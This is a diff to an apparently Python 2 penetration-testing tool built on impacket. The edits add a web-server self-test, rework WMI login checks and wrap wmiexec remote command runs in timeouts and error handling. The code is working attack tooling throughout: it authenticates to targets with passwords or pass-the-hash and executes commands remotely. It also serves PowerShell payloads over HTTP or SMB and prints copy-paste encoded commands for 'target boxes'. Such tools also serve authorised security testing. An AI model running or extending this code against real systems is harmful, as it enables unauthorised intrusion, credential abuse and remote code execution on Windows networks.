@@ -7,7 +7,7 @@ try:
     from impacket import smbserver, version
     from impacket import version, ntlm
     from impacket.dcerpc.v5 import transport, dcomrt
-    from impacket.dcerpc.v5.dtypes import NULL
+    from impacket.dcerpc.v5.dtypes import NULL as null_operator
     from impacket.dcerpc.v5.dcom import wmi
     from impacket.dcerpc.v5.dcomrt import DCOMConnection
     from impacket.examples import logger
@@ -50,7 +50,6 @@ class WMIQUERY(cmd.Cmd):
     def return_data(self):
         return(self.record)
 
-
 '''
 Author: Christopher Duffy
 Date: July 2015
@@ -80,6 +79,9 @@ LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF
 OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 '''
 import base64, sys, argparse, re, subprocess, os, time, logging, signal
+
+#TEMP
+import urllib2
 
 try:
     import netifaces
@@ -368,11 +370,17 @@ def delivery_server(port, working_dir, delivery_method, share_name):
 def http_server(port, working_dir):
     null = open('/dev/null', 'w')
     sub_proc = subprocess.Popen([sys.executable, '-m', 'SimpleHTTPServer', port], cwd=working_dir, stdout=null, stderr=null,)
-    #time.sleep(1)
+    time.sleep(1)
+    #Test Server
+    test_request = "http://127.0.0.1:%s" % (port)
+    try:
+        urllib2.urlopen(test_request).read()
+        print("[*] Catapult web server started successfully on port: %s in directory: %s") % (port, working_dir)
+    except Exception, e:
+        print("[!] Catapult web server failed to start")
     return sub_proc
 
 def smb_server(working_dir, share_name):
-
     note = ''
     smb_srv = smbserver.SimpleSMBServer()
     smb_srv.addShare(share_name.upper(), working_dir, note)
@@ -390,20 +398,18 @@ def wmi_test(usr, pwd, dom, dst, hash, aes, kerberos):
         NTLM  = ''
     namespace = '//./root/cimv2'
     wmi_init = None
+    wmi_shell = None
+    output = False
     try:
         with Timeout(3):
            connection = DCOMConnection(dst, usr, pwd, dom, LM, NTLM, aes, oxidResolver = True, doKerberos = kerberos)
-
            wmi_init = connection.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
            wmi_login = wmi.IWbemLevel1Login(wmi_init)
-           wmi_services = wmi_login.NTLMLogin(namespace, NULL, NULL)
+           wmi_services = wmi_login.NTLMLogin(namespace, null_operator, null_operator)
            wmi_login.RemRelease()
-
            wmi_shell = WMIQUERY(wmi_services)
            wmi_shell.onecmd("SELECT * FROM Win32_Processor")
-
            wmi_services.RemRelease()
-        if wmi_init:
            wmi_init.disconnect()
     except Exception, e:
         #logging.error(str(e))
@@ -412,12 +418,16 @@ def wmi_test(usr, pwd, dom, dst, hash, aes, kerberos):
         print("[!] An error occurred while querying the WMI service: %s") % (e)
         if wmi_init:
             try:
+                wmi_services.RemRelease()
                 wmi_init.disconnect()
             except:
                 pass
-    if wmi_shell.return_data:
-        output = True
-    else:
+    try:
+        if wmi_shell.return_data:
+            output = True
+        else:
+            output = False
+    except Exception, e:
         output = False
     return(output)
 
@@ -732,7 +742,7 @@ Create Pasteable Double Encoded Script:
     if "web" in delivery and "invoker" or "executor" in execution:
         prep = '''[*] Place the PowerShell script ''' + str(payload) + ''' in an empty directory, or use the default /opt/ranger/web.
 [*] Start-up your Python web server as follows Python SimpleHTTPServer ''' + str(src_port) + '''.'''
-        post = '''[*] Copy and paste one of the following commands into the target boxes command shell.
+        post = '''\n[*] Copy and paste one of the following commands into the target boxes command shell.
 [+] This command is unencoded:\n''' + unprotected_command + '''\n
 [+] This command is double encoded:\n''' +command
         if smbexec_cmd:
@@ -768,7 +778,6 @@ Create Pasteable Double Encoded Script:
         for dst in final_targets:
             if attacks:
                 srv = delivery_server(src_port, cwd, delivery, share_name)
-                print("[*] Starting %s server on port %s in %s" ) % (str(delivery), str(src_port), str(cwd))
             if hash:
                 print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
             else:
@@ -782,7 +791,6 @@ Create Pasteable Double Encoded Script:
     elif wmiexec_cmd:
         for dst in final_targets:
             if attacks and encoder:
-                print("[*] Starting %s server on port %s in %s") % (str(delivery), str(src_port), str(cwd))
                 if hash:
                     print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
                 else:
@@ -791,29 +799,46 @@ Create Pasteable Double Encoded Script:
                     sys.exit("[!] You must provide a command or attack for exploitation if you are using wmiexec")
                 test = wmi_test(usr, pwd, dom, dst, hash, aes, kerberos)
                 if test:
-                    srv = delivery_server(src_port, cwd, delivery, share_name)
-                    attack=wmiexec.WMIEXEC(unprotected_command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
-                    attack.run(dst)
-
+                    with Timeout(3):
+                        try:
+                            srv = delivery_server(src_port, cwd, delivery, share_name)
+                            attack = wmiexec.WMIEXEC(unprotected_command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
+                            attack.run(dst)
+                        except Exception, e:
+                            print("[!] An error occurred: %s") % (e)
+                            if srv:
+                                srv.terminate()
+                                print("[*] Shutting down the catapult %s server") % (str(delivery))
             if attacks and not encoder:
                 test = wmi_test(usr, pwd, dom, dst, hash, aes, kerberos)
                 if test:
-                    srv = delivery_server(src_port, cwd, delivery, share_name)
-                    attack=wmiexec.WMIEXEC(unprotected_command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
-                    attack.run(dst)
+                    with Timeout(3):
+                        try:
+                            srv = delivery_server(src_port, cwd, delivery, share_name)
+                            attack = wmiexec.WMIEXEC(unprotected_command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
+                            attack.run(dst)
+                        except Exception, e:
+                            print("[!] An error occurred: %s") % (e)
+                            if srv:
+                                srv.terminate()
+                                print("[*] Shutting down the catapult %s server") % (str(delivery))
                 else:
                     print("[-] Could not gain access to %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
             else:
                 test = wmi_test(usr, pwd, dom, dst, hash, aes, kerberos)
                 if test:
-                    attack=wmiexec.WMIEXEC(command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
-                    attack.run(dst)
+                    with Timeout(3):
+                        try:
+                            srv = delivery_server(src_port, cwd, delivery, share_name)
+                            attack = wmiexec.WMIEXEC(command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
+                            attack.run(dst)
+                        except Exception, e:
+                            print("[!] An error occurred: %s") % (e)
+                            if srv:
+                                srv.terminate()
+                                print("[*] Shutting down the catapult %s server") % (str(delivery))
                 else:
                     print("[-] Could not gain access to %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
-            if attacks:
-                if srv:
-                    srv.terminate()
-                    print("[*] Shutting down the catapult %s server") % (str(delivery))
     elif netview_cmd:
         for dst in final_targets:
             if methods:
@@ -829,7 +854,6 @@ Create Pasteable Double Encoded Script:
         for dst in final_targets:
             if attacks:
                 srv = delivery_server(src_port, cwd, delivery, share_name)
-                print("[*] Starting %s server on port %s in %s") % (str(delivery), str(src_port), str(cwd))
             if hash:
                 print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
             else:
@@ -844,7 +868,6 @@ Create Pasteable Double Encoded Script:
         for dst in final_targets:
             if attacks:
                 srv = delivery_server(src_port, cwd, delivery, share_name)
-                print("[*] Starting %s server on port %s in %s") % (str(delivery), str(src_port), str(cwd))
             if hash:
                 print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
             else:
@@ -855,7 +878,6 @@ Create Pasteable Double Encoded Script:
             attack.play(dst)
             if attacks and not encoder:
                 srv = delivery_server(src_port, cwd, delivery, share_name)
-                print("[*] Starting %s server on port %s in %s") % (str(delivery), str(src_port), str(cwd))
                 if hash:
                     print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
                 else:
